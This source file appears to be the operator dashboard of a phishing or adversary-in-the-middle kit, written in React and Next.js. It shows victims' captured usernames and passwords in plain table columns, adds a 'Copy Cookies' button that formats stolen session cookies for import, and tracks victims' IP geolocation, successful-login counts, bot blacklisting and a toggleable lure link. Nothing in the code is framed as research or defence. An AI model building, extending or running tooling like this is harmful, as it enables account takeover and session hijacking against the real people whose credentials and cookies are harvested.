import { useEffect, useState, useCallback } from "react";
import Layout from "@/components/Layout";
import StatsCard from "../components/StatsCard";
import Image from "next/image";
import { Session, Cookie, GeoData } from "../types";
import CopyIcon from "../components/CopyIcon";
import IPCell from "../components/IPCell";
import LoginPieChart from "@/components/LoginPieChart";
import CountryBarChart from "@/components/CountryBarChart";
import MapWrapper from "@/components/MapWrapper";

interface TokenData {
  [domain: string]: {
    [cookieName: string]: Cookie;
  };
}

type CellValue = string | number | TokenData | null;

interface TableColumn {
  header: string;
  accessor: keyof Session;
  cell: (value: CellValue, session: Session) => React.ReactNode;
}

export default function Dashboard() {
  const [sessions, setSessions] = useState<Session[]>([]);
  const [stats, setStats] = useState({
    totalClicks: 0,
    trueLogin: 0,
    failedLogin: 0,
    blacklistedBots: 0,
  });
  const [showCopied, setShowCopied] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [fullLink, setFullLink] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [geoCache, setGeoCache] = useState<Record<string, GeoData>>({});
  const [operationInProgress, setOperationInProgress] = useState(false);
  const [isServiceRunning, setIsServiceRunning] = useState(true);

  // Pagination state
  const [currentPage, setCurrentPage] = useState(1);
  const itemsPerPage = 50;

  // Get current items for pagination
  const indexOfLastItem = currentPage * itemsPerPage;
  const indexOfFirstItem = indexOfLastItem - itemsPerPage;
  const currentSessions = sessions.slice(indexOfFirstItem, indexOfLastItem);
  const totalPages = Math.ceil(sessions.length / itemsPerPage);

  // Pagination controls
  const goToNextPage = () =>
    setCurrentPage((prev) => Math.min(prev + 1, totalPages));
  const goToPrevPage = () => setCurrentPage((prev) => Math.max(prev - 1, 1));
  const goToPage = (pageNumber: number) => setCurrentPage(pageNumber);

  // Create a wrapper function to show loading state for any async operation
  const withLoading = async <T,>(operation: () => Promise<T>): Promise<T> => {
    setOperationInProgress(true);
    try {
      return await operation();
    } finally {
      setOperationInProgress(false);
    }
  };

  const toggleServiceStatus = () => {
    withLoading(async () => {
      try {
        const response = await fetch("/api/toggle-service", {
          method: "POST",
        });

        if (!response.ok) {
          throw new Error("Failed to toggle service");
        }

        const data = await response.json();

        // Update UI based on action performed
        setIsServiceRunning(data.action === "started");

        // Show success message
        setError(`Link ${data.action} successfully`);
        setTimeout(() => setError(null), 3000);
      } catch (error) {
        console.error("Error toggling service:", error);
        setError(
          error instanceof Error ? error.message : "Failed to toggle service"
        );
        setTimeout(() => setError(null), 3000);
      }
    });
  };

  const handleCopy = useCallback(() => {
    setShowCopied(true);
    setTimeout(() => setShowCopied(false), 2000);
  }, []);

  const handleCopyTokens = (tokens: TokenData) => {
    withLoading(async () => {
      try {
        console.log("Tokens received:", tokens);

        // Validate tokens object
        if (!tokens || typeof tokens !== "object") {
          setError("Cookies not captured in this very log, check the next one");
          setTimeout(() => setError(null), 3000);
          return;
        }

        const domains = Object.keys(tokens);
        if (domains.length === 0) {
          setError("Cookies not captured in this very log, check the next one");
          setTimeout(() => setError(null), 3000);
          return;
        }

        const formattedCookies = domains.flatMap((domain) => {
          const domainCookies = tokens[domain];
          if (!domainCookies || typeof domainCookies !== "object") {
            return [];
          }

          return Object.values(domainCookies).map((cookie) => ({
            name: cookie.Name,
            value: cookie.Value,
            path: cookie.Path || "/",
            domain: domain.startsWith(".") ? domain : `.${domain}`,
            httpOnly: cookie.HttpOnly || false,
          }));
        });

        if (formattedCookies.length === 0) {
          setError("Cookies not captured in this very log, check the next one");
          setTimeout(() => setError(null), 3000);
          return;
        }

        copyToClipboard(JSON.stringify(formattedCookies, null, 2));
        setShowCopied(true);
        setError("✓ Cookies copied successfully!");
        setTimeout(() => {
          setError(null);
          setShowCopied(false);
        }, 3000);
      } catch (error) {
        console.error("Error copying cookies:", error);
        setError("Cookies not captured in this very log, check the next one");
        setTimeout(() => setError(null), 3000);
      }
    });
  };

  const formatDate = (timestamp: number) => {
    const date = new Date(timestamp * 1000);
    return date.toLocaleDateString("en-US", {
      month: "numeric",
      day: "numeric",
      year: "numeric",
      hour: "numeric",
      minute: "numeric",
      hour12: true,
    });
  };

  const calculateStats = useCallback((sessions: Session[]) => {
    return sessions.reduce(
      (acc, session) => ({
        totalClicks: acc.totalClicks + 1,
        trueLogin:
          acc.trueLogin + (session.username && session.password ? 1 : 0),
        failedLogin:
          acc.failedLogin + (!session.username || !session.password ? 1 : 0),
      }),
      { totalClicks: 0, trueLogin: 0, failedLogin: 0 }
    );
  }, []);

  const fetchFullLink = useCallback(async () => {
    return withLoading(async () => {
      try {
        const response = await fetch("/api/full-link");
        if (!response.ok) {
          throw new Error("Failed to fetch link");
        }
        const data = await response.json();
        setFullLink(data.fullUrl);
      } catch (error) {
        console.error("Error fetching link:", error);
      }
    });
  }, []);

  const fetchGeoData = async (ip: string): Promise<GeoData | null> => {
    if (!ip || ip.trim() === "") {
      return null;
    }

    return withLoading(async () => {
      try {
        const response = await fetch(`/api/geoip?ip=${encodeURIComponent(ip)}`);
        if (!response.ok) {
          throw new Error("Failed to lookup IP");
        }
        const data = await response.json();
        return {
          country: data.country || "Unknown",
          city: data.city || "Unknown",
          lat: data.lat || 0,
          lon: data.lon || 0,
        };
      } catch (error) {
        console.error("Error looking up IP:", error);
        return null;
      }
    });
  };

  const copyToClipboard = async (text: string) => {
    return withLoading(async () => {
      try {
        // Try using the clipboard API first
        await navigator.clipboard.writeText(text);
        handleCopy();
        // eslint-disable-next-line @typescript-eslint/no-unused-vars
      } catch (_) {
        console.log("Clipboard API not available, using fallback method");
        // Fallback: Create a temporary textarea element
        const textArea = document.createElement("textarea");
        textArea.value = text;
        textArea.style.position = "fixed";
        textArea.style.left = "-999999px";
        textArea.style.top = "-999999px";
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();

        try {
          // Execute the copy command
          document.execCommand("copy");
          textArea.remove();
          handleCopy();
        } catch (error) {
          console.error("Failed to copy text:", error);
          // You might want to show an error toast here
        }
        textArea.remove();
      }
    });
  };

  const filterLatestCompleteSessions = (sessions: Session[]): Session[] => {
    // Group sessions by ID
    const groupedById = sessions.reduce((acc, session) => {
      if (!acc[session.id]) {
        acc[session.id] = [];
      }
      acc[session.id].push(session);
      return acc;
    }, {} as Record<string, Session[]>);

    // For each ID group, find the latest session with complete cookies
    return Object.values(groupedById).map((group) => {
      // Sort by timestamp descending (latest first)
      const sorted = [...group].sort((a, b) => b.create_time - a.create_time);
      // Find the first (latest) entry with complete cookies
      const latestComplete = sorted.find((session) => {
        const tokens = session.tokens as TokenData;
        return (
          tokens &&
          typeof tokens === "object" &&
          Object.keys(tokens).length > 0 &&
          session.hasCredentials
        );
      });
      // Return the latest complete session, or the latest session if no complete ones exist
      return latestComplete || sorted[0];
    });
  };

  useEffect(() => {
    const fetchData = async () => {
      console.log("Starting data fetch...");
      setOperationInProgress(true);
      setIsLoading(true);

      try {
        console.log("Fetching sessions and blacklist data...");
        const [sessionsResponse, blacklistResponse] = await Promise.all([
          fetch("/api/sessions"),
          fetch("/api/blacklist"),
        ]);

        if (!sessionsResponse.ok || !blacklistResponse.ok) {
          console.error("Response not OK:", {
            sessions: sessionsResponse.status,
            blacklist: blacklistResponse.status,
          });
          const errorData = await sessionsResponse.json();
          throw new Error(errorData.message || "Failed to fetch data");
        }

        const sessionsData: Session[] = await sessionsResponse.json();
        console.log("Received sessions data:", {
          count: sessionsData.length,
          sample: sessionsData.slice(0, 2).map((s) => ({
            id: s.id,
            username: s.username,
            create_time: s.create_time,
          })),
        });

        const blacklistData = await blacklistResponse.json();
        console.log("Received blacklist data:", {
          ipsCount: blacklistData.ips?.length,
        });

        // Fetch geo data for new IPs - only get data for displayed items
        const displayedSessions = sessionsData.slice(0, itemsPerPage * 2); // Load geo data for first 2 pages
        const newGeoCache = { ...geoCache };
        const newIPs = displayedSessions
          .map((s) => s.remote_addr)
          .filter(
            (ip) => typeof ip === "string" && ip.trim() !== "" && !geoCache[ip]
          );

        console.log("New IPs to fetch geo data for:", newIPs.length);

        if (newIPs.length > 0) {
          const geoDataResults = await Promise.all(
            newIPs.map((ip) => fetchGeoData(ip))
          );
          newIPs.forEach((ip, index) => {
            if (geoDataResults[index]) {
              newGeoCache[ip] = geoDataResults[index]!;
            }
          });
          setGeoCache(newGeoCache);
          console.log("Updated geo cache with new IP data");
        }

        const formattedSessions: Session[] = sessionsData.map((session) => ({
          ...session,
          formattedDate: formatDate(session.create_time),
          tokens: session.tokens || {},
          hasCredentials: Boolean(session.username && session.password),
          landing_url: session.landing_url || "",
          geoData:
            typeof session.remote_addr === "string" &&
            session.remote_addr.trim() !== ""
              ? newGeoCache[session.remote_addr]
              : undefined,
        }));

        // Filter to keep only latest complete sessions per ID
        const filteredSessions =
          filterLatestCompleteSessions(formattedSessions);

        // Sort sessions by create_time in descending order (newest first)
        const sortedSessions = filteredSessions.sort(
          (a, b) => b.create_time - a.create_time
        );

        console.log("Formatted and filtered sessions:", {
          originalCount: formattedSessions.length,
          filteredCount: sortedSessions.length,
          sample: sortedSessions.slice(0, 2).map((s) => ({
            id: s.id,
            username: s.username,
            formattedDate: s.formattedDate,
            hasCredentials: s.hasCredentials,
          })),
        });

        setSessions(sortedSessions);
        // Reset to first page when data changes significantly
        if (Math.abs(sortedSessions.length - sessions.length) > 10) {
          setCurrentPage(1);
        }
        setStats({
          ...calculateStats(sortedSessions),
          blacklistedBots: blacklistData.ips?.length || 0,
        });
        console.log("Updated state with new filtered sessions and stats");
      } catch (error) {
        console.error("Error in fetchData:", error);
        setError(error instanceof Error ? error.message : "An error occurred");
      } finally {
        setIsLoading(false);
        setOperationInProgress(false);
      }
    };

    fetchData();
    fetchFullLink();

    // Set up polling interval for data refresh
    const interval = setInterval(() => {
      fetchData();
      fetchFullLink();
    }, 30000); // Refresh data every 30 seconds

    const handleLinkUpdate = () => {
      fetchFullLink();
    };

    window.addEventListener("linkSettingsUpdated", handleLinkUpdate);
    return () => {
      clearInterval(interval);
      window.removeEventListener("linkSettingsUpdated", handleLinkUpdate);
    };
  }, [calculateStats, fetchFullLink, geoCache, itemsPerPage, sessions.length]);

  // Effect to fetch the service status on load
  useEffect(() => {
    const fetchServiceStatus = async () => {
      try {
        const response = await fetch("/api/service-status");

        if (!response.ok) {
          throw new Error("Failed to fetch service status");
        }

        const data = await response.json();
        setIsServiceRunning(data.running);

        if (data.error) {
          console.warn("Service status warning:", data.error);
        }
      } catch (error) {
        console.error("Error fetching service status:", error);
        // Default to false if there's an error
        setIsServiceRunning(false);
      }
    };

    fetchServiceStatus();

    // Set up polling to check service status periodically
    const statusInterval = setInterval(fetchServiceStatus, 30000); // Every 30 seconds

    return () => {
      clearInterval(statusInterval);
    };
  }, []);

  const columns: TableColumn[] = [
    {
      header: "ID",
      accessor: "id",
      cell: (value) => String(value || "N/A"),
    },
    {
      header: "Username",
      accessor: "username",
      cell: (value) => (
        <div className="flex items-center">
          {String(value || "N/A")}
          {value && <CopyIcon text={String(value)} onClick={handleCopy} />}
        </div>
      ),
    },
    {
      header: "Password",
      accessor: "password",
      cell: (value) => (
        <div className="flex items-center">
          {String(value || "N/A")}
          {value && <CopyIcon text={String(value)} onClick={handleCopy} />}
        </div>
      ),
    },
    {
      header: "IP Address",
      accessor: "remote_addr",
      cell: (value) => {
        if (typeof value !== "string") return "Unknown";
        return <IPCell ip={value} onCopy={handleCopy} />;
      },
    },
    {
      header: "Date & Time",
      accessor: "formattedDate",
      cell: (value) => String(value || "N/A"),
    },
    {
      header: "Cookies",
      accessor: "tokens",
      cell: (value, session) => (
        <button
          disabled={!session.hasCredentials}
          className={`px-4 py-1.5 rounded transition-colors ${
            !session.hasCredentials
              ? "bg-transparent-900 text-gray-400 cursor-not-allowed"
              : "bg-indigo-500 text-white hover:bg-indigo-600"
          }`}
          onClick={() => value && handleCopyTokens(value as TokenData)}
        >
          {session.hasCredentials ? "Copy Cookies" : "❌ No Cookies"}
        </button>
      ),
    },
  ];

  return (
    <Layout>
      <div className="space-y-6">
        {error && (
          <div
            className={`${
              error.includes("successfully") ? "bg-green-500" : "bg-red-500"
            } text-white p-4 rounded-lg`}
          >
            {error}
          </div>
        )}

        {(isLoading || operationInProgress) && (
          <div className="fixed top-4 right-4 flex items-center space-x-2 bg-indigo-500 text-white px-3 py-1 rounded-full text-sm z-50">
            <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24">
              <circle
                className="opacity-25"
                cx="12"
                cy="12"
                r="10"
                stroke="currentColor"
                strokeWidth="4"
                fill="none"
              />
              <path
                className="opacity-75"
                fill="currentColor"
                d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
              />
            </svg>
            <span>Updating...</span>
          </div>
        )}

        <div className="grid grid-cols-1 md:grid-cols-4 gap-6">
          <StatsCard
            title="Total Clicks"
            value={stats.totalClicks}
            icon={
              <Image src="/icon1.svg" alt="Clicks" width={40} height={40} />
            }
          />
          <StatsCard
            title="True Login"
            value={stats.trueLogin}
            icon={
              <Image src="/icon2.svg" alt="Clicks" width={32} height={32} />
            }
          />
          <StatsCard
            title="Didn't Login"
            value={stats.failedLogin}
            icon={
              <Image src="/icon3.svg" alt="Clicks" width={32} height={32} />
            }
          />
          <StatsCard
            title="Number Of Bots"
            value={stats.blacklistedBots}
            icon={<Image src="/bot.svg" alt="Bots" width={35} height={35} />}
          />
        </div>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
          <LoginPieChart
            trueLogin={stats.trueLogin}
            failedLogin={stats.failedLogin}
          />
          <CountryBarChart sessions={sessions} />
          <MapWrapper sessions={sessions} />
        </div>

        <div className="bg-[#232A34] px-6 py-6 rounded-lg grid grid-cols-2 gap-4">
          {/* Left half - Your Link section */}
          <div className="flex items-center space-x-4">
            <div className="flex-shrink-0">
              <Image src="/icon4.svg" alt="Link" width={32} height={32} />
            </div>
            <div className="flex-grow">
              <div className="text-sm text-gray-400">Your Link:</div>
              <div className="text-gray-300 font-medium flex items-center space-x-2">
                <span data-allow-select="true">
                  {fullLink || "No active link generated"}
                </span>
                {fullLink && (
                  <button
                    onClick={() => copyToClipboard(fullLink)}
                    data-allow-context-menu="true"
                    className="text-indigo-500 hover:text-indigo-400 transition-colors"
                  >
                    <svg
                      className="w-5 h-5"
                      fill="none"
                      stroke="currentColor"
                      viewBox="0 0 24 24"
                    >
                      <path
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        strokeWidth={2}
                        d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"
                      />
                    </svg>
                  </button>
                )}
              </div>
            </div>
          </div>

          {/* Right half - Link status and button */}
          <div className="flex items-center justify-end space-x-4">
            <div
              className={`px-4 py-1 border border-dashed rounded ${
                isServiceRunning
                  ? "text-green-500 border-green-500"
                  : "text-gray-500 border-gray-500"
              }`}
            >
              <span className="font-medium">Link Status:</span>{" "}
              <span className="italic">
                {isServiceRunning ? "running..." : "stopped"}
              </span>
            </div>
            <button
              onClick={toggleServiceStatus}
              className={`${
                isServiceRunning
                  ? "bg-red-500 hover:bg-red-600"
                  : "bg-green-500 hover:bg-green-600"
              } text-white px-6 py-1 rounded transition-colors`}
            >
              {isServiceRunning ? "Stop Link" : "Run Link"}
            </button>
          </div>
        </div>

        <div className="overflow-x-auto">
          <table className="min-w-full bg-[#232A34] rounded-lg">
            <thead>
              <tr>
                {columns.map((column) => (
                  <th
                    key={column.accessor}
                    className="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider"
                  >
                    {column.header}
                  </th>
                ))}
              </tr>
            </thead>
            <tbody className="divide-y divide-gray-700">
              {currentSessions.map((session) => (
                <tr key={session.id}>
                  {columns.map((column) => {
                    const value = session[column.accessor];
                    const safeValue = typeof value === "boolean" ? null : value;
                    return (
                      <td
                        key={`${session.id}-${column.accessor}`}
                        className="px-6 py-4 whitespace-nowrap text-sm text-gray-300"
                        data-allow-select="true"
                      >
                        {column.cell(safeValue as CellValue, session)}
                      </td>
                    );
                  })}
                </tr>
              ))}
            </tbody>
          </table>

          {/* Pagination UI */}
          {totalPages > 1 && (
            <div className="flex items-center justify-between px-4 py-3 bg-[#1B2028] border-t border-gray-700 mt-2 rounded-b-lg">
              <div className="flex-1 flex justify-between sm:hidden">
                <button
                  onClick={goToPrevPage}
                  disabled={currentPage === 1}
                  className={`relative inline-flex items-center px-4 py-2 border border-gray-600 text-sm font-medium rounded-md ${
                    currentPage === 1
                      ? "bg-gray-700 text-gray-400 cursor-not-allowed"
                      : "bg-[#232A34] text-white hover:bg-gray-700"
                  }`}
                >
                  Previous
                </button>
                <button
                  onClick={goToNextPage}
                  disabled={currentPage === totalPages}
                  className={`ml-3 relative inline-flex items-center px-4 py-2 border border-gray-600 text-sm font-medium rounded-md ${
                    currentPage === totalPages
                      ? "bg-gray-700 text-gray-400 cursor-not-allowed"
                      : "bg-[#232A34] text-white hover:bg-gray-700"
                  }`}
                >
                  Next
                </button>
              </div>
              <div className="hidden sm:flex-1 sm:flex sm:items-center sm:justify-between">
                <div>
                  <p className="text-sm text-gray-400">
                    Showing{" "}
                    <span className="font-medium text-gray-300">
                      {indexOfFirstItem + 1}
                    </span>{" "}
                    to{" "}
                    <span className="font-medium text-gray-300">
                      {Math.min(indexOfLastItem, sessions.length)}
                    </span>{" "}
                    of{" "}
                    <span className="font-medium text-gray-300">
                      {sessions.length}
                    </span>{" "}
                    results
                  </p>
                </div>
                <div>
                  <nav
                    className="relative z-0 inline-flex rounded-md shadow-sm -space-x-px"
                    aria-label="Pagination"
                  >
                    <button
                      onClick={goToPrevPage}
                      disabled={currentPage === 1}
                      className={`relative inline-flex items-center px-2 py-2 rounded-l-md border border-gray-600 bg-[#232A34] text-sm font-medium ${
                        currentPage === 1
                          ? "text-gray-400 cursor-not-allowed"
                          : "text-gray-300 hover:bg-gray-700"
                      }`}
                    >
                      <span className="sr-only">Previous</span>
                      <svg
                        className="h-5 w-5"
                        xmlns="http://www.w3.org/2000/svg"
                        viewBox="0 0 20 20"
                        fill="currentColor"
                        aria-hidden="true"
                      >
                        <path
                          fillRule="evenodd"
                          d="M12.707 5.293a1 1 0 010 1.414L9.414 10l3.293 3.293a1 1 0 01-1.414 1.414l-4-4a1 1 0 010-1.414l4-4a1 1 0 011.414 0z"
                          clipRule="evenodd"
                        />
                      </svg>
                    </button>

                    {/* Page numbers - show limited set to avoid overflow */}
                    {Array.from({ length: Math.min(5, totalPages) }, (_, i) => {
                      // Calculate which pages to show
                      let pageNum;
                      if (totalPages <= 5) {
                        pageNum = i + 1;
                      } else if (currentPage <= 3) {
                        pageNum = i + 1;
                      } else if (currentPage >= totalPages - 2) {
                        pageNum = totalPages - 4 + i;
                      } else {
                        pageNum = currentPage - 2 + i;
                      }

                      return (
                        <button
                          key={pageNum}
                          onClick={() => goToPage(pageNum)}
                          className={`relative inline-flex items-center px-4 py-2 border border-gray-600 text-sm font-medium ${
                            currentPage === pageNum
                              ? "bg-indigo-600 text-white"
                              : "bg-[#232A34] text-gray-300 hover:bg-gray-700"
                          }`}
                        >
                          {pageNum}
                        </button>
                      );
                    })}

                    <button
                      onClick={goToNextPage}
                      disabled={currentPage === totalPages}
                      className={`relative inline-flex items-center px-2 py-2 rounded-r-md border border-gray-600 bg-[#232A34] text-sm font-medium ${
                        currentPage === totalPages
                          ? "text-gray-400 cursor-not-allowed"
                          : "text-gray-300 hover:bg-gray-700"
                      }`}
                    >
                      <span className="sr-only">Next</span>
                      <svg
                        className="h-5 w-5"
                        xmlns="http://www.w3.org/2000/svg"
                        viewBox="0 0 20 20"
                        fill="currentColor"
                        aria-hidden="true"
                      >
                        <path
                          fillRule="evenodd"
                          d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z"
                          clipRule="evenodd"
                        />
                      </svg>
                    </button>
                  </nav>
                </div>
              </div>
            </div>
          )}
        </div>

        {showCopied && (
          <div className="fixed bottom-4 right-4 bg-green-500 text-white px-4 py-2 rounded-lg shadow-lg">
            Copied!
          </div>
        )}
      </div>
    </Layout>
  );
}
